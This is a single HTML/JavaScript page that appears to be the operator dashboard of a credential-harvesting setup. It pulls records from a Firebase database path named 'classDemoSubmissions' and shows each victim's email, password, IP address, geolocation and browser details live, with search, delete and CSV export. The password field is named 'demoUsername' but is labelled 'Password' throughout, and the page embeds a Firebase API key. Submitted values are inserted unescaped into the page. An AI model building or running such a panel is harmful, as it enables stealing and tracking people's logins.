<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin Dashboard</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
  <style>
    * { box-sizing: border-box; font-family: 'Inter', sans-serif; }
    body {
      margin: 0;
      background: #f8fafc;
      color: #0f172a;
    }
    .topbar {
      background: white;
      border-bottom: 1px solid #e2e8f0;
      padding: 16px 24px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      position: sticky;
      top: 0;
      z-index: 10;
    }
    .topbar h1 {
      font-size: 18px;
      margin: 0;
      font-weight: 600;
    }
    .stats {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 16px;
      padding: 24px;
    }
    .stat-card {
      background: white;
      border: 1px solid #e2e8f0;
      border-radius: 12px;
      padding: 20px;
    }
    .stat-card h3 {
      font-size: 13px;
      color: #64748b;
      margin: 0 0 8px;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }
    .stat-card .value {
      font-size: 28px;
      font-weight: 600;
    }
    .container { padding: 0 24px 24px; }
    .card {
      background: white;
      border: 1px solid #e2e8f0;
      border-radius: 12px;
      overflow: hidden;
    }
    .card-header {
      padding: 16px 20px;
      border-bottom: 1px solid #e2e8f0;
      display: flex;
      flex-wrap: wrap;
      gap: 12px;
      justify-content: space-between;
      align-items: center;
    }
    .search {
      padding: 10px 14px;
      border: 1px solid #e2e8f0;
      border-radius: 8px;
      width: 280px;
      max-width: 100%;
    }
    .btn {
      padding: 10px 16px;
      border-radius: 8px;
      border: none;
      cursor: pointer;
      font-weight: 500;
    }
    .btn-primary { background: #0f172a; color: white; }
    .btn-danger {
      background: #fff1f2;
      color: #be123c;
      border: 1px solid #fecdd3;
    }
    .btn-danger:hover { background: #ffe4e6; }
    table {
      width: 100%;
      border-collapse: collapse;
    }
    th {
      font-size: 12px;
      text-transform: uppercase;
      color: #64748b;
      font-weight: 500;
      padding: 12px 20px;
      text-align: left;
      background: #f8fafc;
      border-bottom: 1px solid #e2e8f0;
      vertical-align: top;
    }
    td {
      padding: 14px 20px;
      border-bottom: 1px solid #f1f5f9;
      font-size: 14px;
      vertical-align: top;
    }
    .badge {
      display: inline-block;
      background: #f1f5f9;
      padding: 4px 10px;
      border-radius: 20px;
      font-size: 13px;
      font-weight: 500;
    }
    .empty {
      padding: 40px;
      text-align: center;
      color: #64748b;
    }
    .meta-cell {
      max-width: 220px;
      word-break: break-word;
      color: #475569;
      line-height: 1.5;
    }
    .status-ok {
      color: #16a34a;
      font-weight: 600;
    }
    .status-red {
      color: #dc2626;
      font-weight: 600;
    }
    @media (max-width: 768px) {
      .stats { grid-template-columns: 1fr 1fr; padding: 16px; }
      .container { padding: 0 16px 16px; }
      .card-header {
        flex-direction: column;
        align-items: stretch;
      }
      .search { width: 100%; }
      table { display: none; }
      .cards-mobile { display: block; }
    }
    @media (min-width: 769px) {
      .cards-mobile { display: none; }
    }
    .mobile-item {
      padding: 16px 20px;
      border-bottom: 1px solid #f1f5f9;
      display: flex;
      justify-content: space-between;
      gap: 12px;
    }
    .mobile-item .label {
      color: #64748b;
      font-size: 12px;
      margin-top: 8px;
    }
    .mobile-item .val {
      font-weight: 500;
      font-size: 14px;
      word-break: break-word;
    }
  </style>
</head>
<body>
  <div class="topbar">
    <h1>Dashboard</h1>
    <button class="btn btn-primary" id="exportBtn">Export CSV</button>
  </div>

  <div class="stats">
    <div class="stat-card">
      <h3>Total Submissions</h3>
      <div class="value" id="count">0</div>
    </div>
    <div class="stat-card">
      <h3>Live Status</h3>
      <div class="value" style="font-size:14px;color:#16a34a">● Connected</div>
    </div>
  </div>

  <div class="container">
    <div class="card">
      <div class="card-header">
        <input type="text" id="search" class="search" placeholder="Search email, username, location or IP...">
        <span style="font-size:13px;color:#64748b" id="lastUpdate">Live updating...</span>
      </div>

      <table>
        <thead>
          <tr>
            <th>Email</th>
            <th>Password</th>
            <th>IP Address</th>
            <th>Location</th>
            <th>Browser / Device</th>
            <th>Submitted</th>
            <th></th>
          </tr>
        </thead>
        <tbody id="table-body">
          <tr><td colspan="7" class="empty">Loading...</td></tr>
        </tbody>
      </table>

      <div id="cards-mobile" class="cards-mobile"></div>
    </div>
  </div>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/13.0.0/firebase-app.js";
    import { getDatabase, ref, onValue, remove } from "https://www.gstatic.com/firebasejs/13.0.0/firebase-database.js";

    const firebaseConfig = {
      apiKey: "AIzaSyDUngpiO9vKffUbV5mQClFInB68dsD-MII",
      authDomain: "fir-9b3f9.firebaseapp.com",
      databaseURL: "https://fir-9b3f9-default-rtdb.firebaseio.com",
      projectId: "fir-9b3f9",
      storageBucket: "fir-9b3f9.firebasestorage.app",
      messagingSenderId: "392348885618",
      appId: "1:392348885618:web:442013cefdb06386db98eb"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    const tableBody = document.getElementById("table-body");
    const cardsMobile = document.getElementById("cards-mobile");
    const countEl = document.getElementById("count");
    let allData = [];

    function formatLocation(location) {
      if (!location) return "Unknown";
      if (typeof location === "string") return location;

      const parts = [
        location.city,
        location.region,
        location.country,
        location.countryCode,
        location.timezone
      ].filter(Boolean);

      return parts.length ? parts.join(", ") : "Unknown";
    }

    function formatBrowserMeta(v) {
      const parts = [];
      if (v.userAgent) parts.push(v.userAgent);
      if (v.browserLanguage) parts.push(v.browserLanguage);
      if (v.pageUrl) parts.push(v.pageUrl);
      if (v.referrer) parts.push(`Ref: ${v.referrer}`);
      return parts.length ? parts.join(" | ") : "N/A";
    }

    function render(data) {
      tableBody.innerHTML = "";
      cardsMobile.innerHTML = "";

      if (!data.length) {
        tableBody.innerHTML = `<tr><td colspan="7" class="empty">No submissions yet</td></tr>`;
        return;
      }

      data.forEach(({ id, email, demoUsername, ipAddress, location, browserMeta, time }) => {
        const locationText = formatLocation(location);

        const tr = document.createElement("tr");
        tr.innerHTML = `
          <td style="font-weight:500">${email || "N/A"}</td>
          <td><span class="badge">${demoUsername || "N/A"}</span></td>
          <td class="meta-cell">${ipAddress || "Unknown"}</td>
          <td class="meta-cell">${locationText}</td>
          <td class="meta-cell">${browserMeta || "N/A"}</td>
          <td style="color:#64748b">${time}</td>
          <td><button class="btn btn-danger" data-id="${id}">Delete</button></td>
        `;
        tableBody.appendChild(tr);

        const div = document.createElement("div");
        div.className = "mobile-item";
        div.innerHTML = `
          <div>
            <div class="label">Email</div><div class="val">${email || "N/A"}</div>
            <div class="label">Password</div><div class="val">${demoUsername || "N/A"}</div>
            <div class="label">IP</div><div class="val">${ipAddress || "Unknown"}</div>
            <div class="label">Location</div><div class="val">${locationText}</div>
            <div class="label">Browser / Device</div><div class="val">${browserMeta || "N/A"}</div>
            <div class="label">Submitted</div><div class="val">${time}</div>
          </div>
          <div><button class="btn btn-danger" data-id="${id}">Del</button></div>
        `;
        cardsMobile.appendChild(div);
      });

      document.querySelectorAll(".btn-danger").forEach(btn => {
        btn.addEventListener("click", async (e) => {
          const id = e.currentTarget.getAttribute("data-id");
          if (confirm("Delete this submission?")) {
            await remove(ref(db, `classDemoSubmissions/${id}`));
          }
        });
      });
    }

    onValue(ref(db, "classDemoSubmissions"), (snap) => {
      const val = snap.val();

      if (!val) {
        allData = [];
        countEl.textContent = "0";
        render([]);
        return;
      }

      allData = Object.entries(val)
        .map(([id, v]) => ({
          id,
          email: v.email || "",
          demoUsername: v.demoUsername || "",
          ipAddress: v.ipAddress || "",
          location: v.location || null,
          browserMeta: formatBrowserMeta({
            userAgent: v.userAgent || "",
            browserLanguage: v.browserLanguage || "",
            pageUrl: v.pageUrl || "",
            referrer: v.referrer || ""
          }),
          time: v.createdAt ? new Date(v.createdAt).toLocaleString() : new Date().toLocaleString(),
          rawTime: v.createdAt || 0
        }))
        .sort((a, b) => b.rawTime - a.rawTime);

      countEl.textContent = allData.length;
      document.getElementById("lastUpdate").textContent = "Updated just now";
      render(allData);
    });

    document.getElementById("search").addEventListener("input", (e) => {
      const q = e.target.value.toLowerCase();
      const filtered = allData.filter((x) => {
        const locationText = formatLocation(x.location).toLowerCase();
        return (
          (x.email || "").toLowerCase().includes(q) ||
          (x.demoUsername || "").toLowerCase().includes(q) ||
          (x.ipAddress || "").toLowerCase().includes(q) ||
          locationText.includes(q)
        );
      });
      render(filtered);
    });

    document.getElementById("exportBtn").addEventListener("click", () => {
      if (!allData.length) return alert("No data available to export.");

      const csv = [
        "Email,Password,IP Address,Location,Browser/Device,Submitted",
        ...allData.map((r) => {
          const locationText = formatLocation(r.location).replace(/"/g, '""');
          const browserText = (r.browserMeta || "").replace(/"/g, '""');
          return `"${(r.email || "").replace(/"/g, '""')}","${(r.demoUsername || "").replace(/"/g, '""')}","${(r.ipAddress || "").replace(/"/g, '""')}","${locationText}","${browserText}","${(r.time || "").replace(/"/g, '""')}"`;
        })
      ].join("\n");

      const blob = new Blob([csv], { type: "text/csv;charset=utf-8;" });
      const a = document.createElement("a");
      a.href = URL.createObjectURL(blob);
      a.download = "submissions.csv";
      a.click();
    });
  </script>
</body>
</html>
